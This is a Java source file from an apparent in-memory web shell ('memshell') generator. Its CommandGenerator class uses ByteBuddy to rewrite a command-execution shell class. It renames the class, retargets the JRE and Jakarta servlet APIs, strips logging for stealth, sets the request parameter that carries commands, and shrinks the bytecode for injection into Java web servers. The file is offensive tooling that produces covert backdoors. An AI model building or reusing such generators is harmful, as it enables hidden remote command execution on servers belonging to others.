package com.reajason.javaweb.memshell.generator;

import com.reajason.javaweb.ClassBytesShrink;
import com.reajason.javaweb.buddy.LdcReAssignVisitorWrapper;
import com.reajason.javaweb.buddy.LogRemoveMethodVisitor;
import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.CommandConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;
import org.apache.commons.lang3.StringUtils;

import java.util.HashMap;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
public class CommandGenerator {
    private final ShellConfig shellConfig;
    private final CommandConfig commandConfig;

    public CommandGenerator(ShellConfig shellConfig, CommandConfig commandConfig) {
        this.shellConfig = shellConfig;
        this.commandConfig = commandConfig;
    }

    public DynamicType.Builder<?> getBuilder() {
        if (commandConfig.getShellClass() == null) {
            throw new IllegalArgumentException("commandConfig.getClazz() == null");
        }

        DynamicType.Builder<?> builder = new ByteBuddy()
                .redefine(commandConfig.getShellClass())
                .name(commandConfig.getShellClassName())
                .visit(new TargetJreVersionVisitorWrapper(shellConfig.getTargetJreVersion()));

        if (shellConfig.isJakarta()) {
            builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
        }

        if (shellConfig.isDebugOff()) {
            builder = LogRemoveMethodVisitor.extend(builder);
        }

        String shellType = shellConfig.getShellType();
        if (!ShellType.WEBSOCKET.equals(shellType)) {
            if (StringUtils.startsWith(shellType, ShellType.AGENT)) {
                builder = builder.visit(
                        new LdcReAssignVisitorWrapper(new HashMap<Object, Object>(1) {{
                            put("paramName", commandConfig.getParamName());
                        }})
                );
            } else {
                builder = builder.field(named("paramName")).value(commandConfig.getParamName());
            }
        }

        return builder;
    }

    public byte[] getBytes() {
        DynamicType.Builder<?> builder = getBuilder();
        try (DynamicType.Unloaded<?> make = builder.make()) {
            return ClassBytesShrink.shrink(make.getBytes(), shellConfig.isShrink());
        }
    }
}